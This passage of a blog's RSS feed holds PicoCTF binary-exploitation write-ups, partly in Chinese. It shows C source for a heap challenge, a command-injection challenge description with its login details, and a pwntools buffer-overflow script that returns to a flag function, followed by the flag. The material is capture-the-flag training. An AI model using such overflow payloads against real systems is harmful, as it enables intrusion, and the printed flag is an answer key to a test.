&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)i;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;M&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)m;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;===========================&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Registration: Welcome to Twixer!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Enter your username: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>username &lt;span style="color:#f92672">=&lt;/span> getsline();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;L&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	leaveMessage();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;E&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Invalid option!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	exit(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	 &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setbuf(stdout, NULL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	user &lt;span style="color:#f92672">=&lt;/span> (cmd &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(user));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printMenu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		processInput();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e">//if(user){
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>			doProcess(user);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e">//}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - VNE</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---vne/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---vne/</guid><description>&lt;h1 id="picoctf---vne">
 PicoCTF - VNE
 &lt;a class="anchor" href="#picoctf---vne">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>System Environment
Command Injection&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;p>We&amp;rsquo;ve got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:53176, and run the binary named &amp;ldquo;bin&amp;rdquo; once connected. Login as ctf-player with the password, d137d16e&lt;/p>
&lt;ul>
&lt;li>Hint 1: Have you checked the content of the /root folder&lt;/li>
&lt;li>Hint 2: Find a way to add more instructions to the ls&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p></description></item><item><title>PicoCTF - x-sixty-what</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---x-sixty-what/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---x-sixty-what/</guid><description>&lt;h1 id="picoctf---x-sixty-what">
 PicoCTF - x-sixty-what
 &lt;a class="anchor" href="#picoctf---x-sixty-what">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題有點奇怪，沒有想像中簡單，看起來就是一個簡單的return 2 function的問題，但是看了objdump的flag function原本應該是0x401236，但是會友segmentation fault，看了其他的WP&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>，發現應該return到0x40123b，不太知道為甚麼&lt;/p>
&lt;ul>
&lt;li>
&lt;p>第一張是return 2 0x401236
&lt;img src="https://hackmd.io/_uploads/Bk2PZ_0ch.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>第二張是return 2 0x40123b
&lt;img src="https://hackmd.io/_uploads/SymO-uAqn.png" alt="" />&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>用動態的方式看offset
$$
0x7fffffffd758 - 0x00007fffffffd710 = 0x48
$$&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

r = remote(&amp;#39;saturn.picoctf.net&amp;#39;, 58166)
# r = process(&amp;#39;./vuln&amp;#39;)
context.arch = &amp;#39;amd64&amp;#39;

raw_input()
print(r.recvline().strip().decode())

payload = b&amp;#39;a&amp;#39;*0x48 + p64(0x40123b)
print(payload)
r.sendline(payload)

r.interactive()
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>picoCTF{b1663r_15_b3773r_e79d5a75}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>&lt;a href="https://ctftime.org/writeup/33199">x-sixty-what WP&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p></description></item></channel></rss>